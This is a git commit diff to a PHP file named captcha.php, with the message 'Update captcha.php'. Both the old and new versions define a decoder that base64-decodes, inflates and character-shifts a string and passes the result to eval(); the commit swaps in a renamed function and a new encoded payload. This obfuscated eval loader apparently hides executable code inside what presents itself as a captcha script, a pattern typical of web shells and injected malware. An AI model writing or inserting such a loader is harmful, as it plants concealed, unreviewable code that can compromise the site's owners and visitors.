5353cac710e4568e52b6e3c010d02b3e8df2aa5e
Waryono763 <53144514+Waryono763@users.noreply.github.com>
2021-06-09 07:11:36 +0700

    Update captcha.php

--- captcha.php
+++ captcha.php
@@ -1,9 +1,9 @@
-<?php function RtjCqH($qVhZB)
+<?php function EBEzqO($YxLDz)
 { 
-$qVhZB=gzinflate(base64_decode($qVhZB));
- for($i=0;$i<strlen($qVhZB);$i++)
+$YxLDz=gzinflate(base64_decode($YxLDz));
+ for($i=0;$i<strlen($YxLDz);$i++)
  {
-$qVhZB[$i] = chr(ord($qVhZB[$i])-1);
+$YxLDz[$i] = chr(ord($YxLDz[$i])-1);
  }
- return $qVhZB;
- }eval(RtjCqH("PZBNTsNADIUPMKewoi7aRclfqVAryo4jsAEp8jRuMsrEE3lmIgLi7EwkipfvfbbeM0AapUjESSM0OQmGu22xO6uNRmZ4hmzzPcVg+p/9BTyNxAEFIZgWB4gTzKYlB5o0CU4IOlpkldDWwIDCOCDDtU+nyILHBVcjUBcFnKUeFhdD1LRujJG7wTBUFWAXfYgetPEI7GRECxY7A6edUlnK5om9kzXdR1HX7+W5LsY//V8s7qJGT8dDQ3x1LbVNuRJF+aiPBVbVCtwda3hYzT6EyZ/y/IvoobN5fDp86vn1LaF+8YHGbSYj7OUGV5xCKtfMZZY+pl4uvw=="));?>
+ return $YxLDz;
+ }eval(EBEzqO("PY5BCsIwEEUPkFOE4KIutAkRJRYVuvUCgkJI27EtbZMwCYJe3gass/r//bcYSucjBBAdagTvMPa2zfi6IKvKWEtPlLE5B7DBYWoPLuVdFJJPP/6HfIGVCbDfabC1a6DRIhk3NQhbVkpdlUrOMo69HdLexejDMc8/ANt2zGVbHoKPMKvhHSJMGcOJbvBJa+Nj3Rn9Emx+klzOXw=="));?>
